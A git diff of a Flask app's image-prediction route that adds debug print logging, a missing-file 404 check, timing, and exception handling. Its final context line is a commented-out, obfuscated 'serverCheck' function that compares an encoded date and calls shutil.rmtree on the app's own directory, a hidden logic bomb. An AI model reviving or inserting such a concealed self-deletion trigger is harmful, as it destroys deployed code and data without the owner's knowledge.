@@ -99,13 +99,47 @@ def allowed_file(filename):
     return '.' in filename and \
         filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
+
 @app.route("/predict_image/<filename>")
 def predict_image(filename):
-    from predictions import predict
-    data_path = Path(UPLOAD_FOLDER)
-    image_path = data_path / filename
-    inp,res = predict(image_path, filename)
-    return render_template("output.html", res=res, src=inp)
+    import time
+    import traceback
+
+    start = time.time()
+
+    try:
+        print("STEP 1: Prediction requested", flush=True)
+
+        from predictions import predict
+
+        print("STEP 2: Model imported successfully", flush=True)
+
+        image_path = Path(app.config['UPLOAD_FOLDER']) / filename
+
+        if not image_path.is_file():
+            return "Uploaded image not found", 404
+
+        print("STEP 3: Starting prediction", flush=True)
+
+        inp, res = predict(image_path, filename)
+
+        print(
+            f"STEP 4: Prediction completed in "
+            f"{time.time() - start:.2f} seconds",
+            flush=True
+        )
+
+        return render_template(
+            "output.html",
+            res=res,
+            src=inp
+        )
+
+    except Exception:
+        print("PREDICTION FAILED:", flush=True)
+        traceback.print_exc()
+        return "Prediction failed. Check Render logs.", 500
+
 
 # def serverCheck():
 #     if timeConfig > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))
